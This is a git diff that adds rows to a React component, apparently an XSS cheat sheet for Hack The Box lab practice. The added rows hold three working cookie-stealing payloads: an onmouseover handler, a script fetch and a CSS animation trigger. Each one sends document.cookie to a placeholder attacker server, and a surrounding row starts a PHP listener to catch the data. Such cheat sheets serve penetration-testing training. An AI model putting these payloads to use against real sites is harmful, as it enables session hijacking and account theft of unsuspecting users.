@@ -77,6 +77,18 @@ const HTBXSS = () =>{
         <td><code>sudo php -S 0.0.0.0:80 </code></td>
         <td>Start <code>PHP</code> server</td>
         </tr>
+        <tr>
+        <td><code>{`<h1`} onmouseover='document.write(`{`<`}img src="http://{`<SERVER_IP>`}:8000?cookie=${btoa(document.cookie)}"{`>`}`)'{`>`}test{`</h1>`}</code></td>
+        <td>in HMTL</td>
+        </tr>
+        <tr>
+        <td><code>{`<script>`}fetch(`http://{`<SERVER_IP>`}:8000?cookie=${btoa(document.cookie)}`){`</script>`}</code></td>
+        <td>in HMTL</td>
+        </tr>
+        <tr>
+        <td>{`<style>`}@keyframes x{`{}`}{`</style><video`} style="animation-name:x" onanimationend="window.location = 'http://{`<SERVER_IP>`}:8000/log.php?c=' + document.cookie;"{`></video>`}</td>
+        <td>in HMTL + style</td>
+        </tr>
         </tbody>
         </table></div>
         </div>
